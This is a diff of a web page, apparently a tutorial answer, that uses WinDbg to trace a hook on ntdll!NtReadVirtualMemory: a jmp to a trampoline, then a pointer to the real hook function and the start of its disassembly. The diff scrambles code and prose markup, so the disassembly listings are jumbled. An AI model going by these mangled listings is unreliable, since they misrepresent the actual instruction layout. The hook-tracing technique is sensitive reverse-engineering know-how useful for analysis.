-00007ffd`3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
-00007ffd`3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd`3ef0dcd5)
-00007ffd`3ef0dcd2 0f05            syscall
-00007ffd`3ef0dcd4 c3              ret
+00007ffd<code>3ef0dcc0 e95b331600      jmp     00007ffd</code>3f071020
+00007ffd<code>3ef0dcc5 cc              int     3 00007ffd</code>3ef0dcc6 cc              int     3
+00007ffd<code>3ef0dcc7 cc              int     3 00007ffd</code>3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000<code>7ffe0308)],1 00007ffd</code>3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd<code>3ef0dcd5) 00007ffd</code>3ef0dcd2 0f05            syscall
+00007ffd`3ef0dcd4 c3              ret</p>
+<pre><code>
+then look at the jump address and disassemble:
 </code></pre>
-<p>then look at the jump address and disassemble:</p>
-<pre><code>u 00007ffd`3f071020
-00007ffd`3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
-00007ffd`3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx
-00007ffd`3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
-00007ffd`3f071040 ff1522000000    call    qword ptr [00007ffd`3f071068]
-00007ffd`3f071046 9c              pushfq
-00007ffd`3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
-00007ffd`3f071053 740a            je      00007ffd`3f07105f
-00007ffd`3f071055 9d              popfq
+<p>u 00007ffd<code>3f071020 00007ffd</code>3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
+00007ffd<code>3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx 00007ffd</code>3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
+00007ffd<code>3f071040 ff1522000000    call    qword ptr [00007ffd</code>3f071068]
+00007ffd<code>3f071046 9c              pushfq 00007ffd</code>3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
+00007ffd<code>3f071053 740a            je      00007ffd</code>3f07105f
+00007ffd`3f071055 9d              popfq</p>
+<pre><code>
+**call qword ptr [00007ffd3f071068]:** This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.
+
+**Examine 00007ffd3f071068:** Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.
+
 </code></pre>
-<p><strong>call qword ptr [00007ffd3f071068]:</strong> This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.</p>
-<p><strong>Examine 00007ffd3f071068:</strong> Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.</p>
-<pre><code>dq 00007ffd3f071068
-00007ffd`3f071068  00007df4`cda31000 cccccccc`cccccccc
-00007ffd`3f071078  cccccccc`cccccccc 24a48d48`36363636
-00007ffd`3f071088  89483636`ffffff00 b948ffff`ff38248c
-00007ffd`3f071098  00007df4`cda20dc0 489c0000`002215ff
-00007ffd`3f0710a8  fffffffe`f82484f7 36369d0a`74ffffff
-00007ffd`3f0710b8  9dfffffe`f024a4ff cccccccc`ccccccc3
-00007ffd`3f0710c8  00007df4`cda31000 cccccccc`cccccccc
-00007ffd`3f0710d8  cccccccc`cccccccc 24a48d48`36363636
-</code></pre>
-<p>The important part is 00007df4cda31000. This is the address where the <em>real</em> hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).</p>
-<p>Next step:</p>
-<p>Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.</p>
-<pre><code class="language-code">u 00007df4`cda31000
+<p>dq 00007ffd3f071068
+00007ffd<code>3f071068  00007df4</code>cda31000 cccccccc<code>cccccccc 00007ffd</code>3f071078  cccccccc<code>cccccccc 24a48d48</code>36363636
+00007ffd<code>3f071088  89483636</code>ffffff00 b948ffff<code>ff38248c 00007ffd</code>3f071098  00007df4<code>cda20dc0 489c0000</code>002215ff
+00007ffd<code>3f0710a8  fffffffe</code>f82484f7 36369d0a<code>74ffffff 00007ffd</code>3f0710b8  9dfffffe<code>f024a4ff cccccccc</code>ccccccc3
+00007ffd<code>3f0710c8  00007df4</code>cda31000 cccccccc<code>cccccccc 00007ffd</code>3f0710d8  cccccccc<code>cccccccc 24a48d48</code>36363636</p>
+<pre><code>The important part is 00007df4cda31000. This is the address where the *real* hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).
+
+Next step:
+
+Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.
+
+```code
+u 00007df4`cda31000
 00007df4`cda31000 9c              pushfq
 00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
 00007df4`cda3100c 7515            jne     00007df4`cda31023
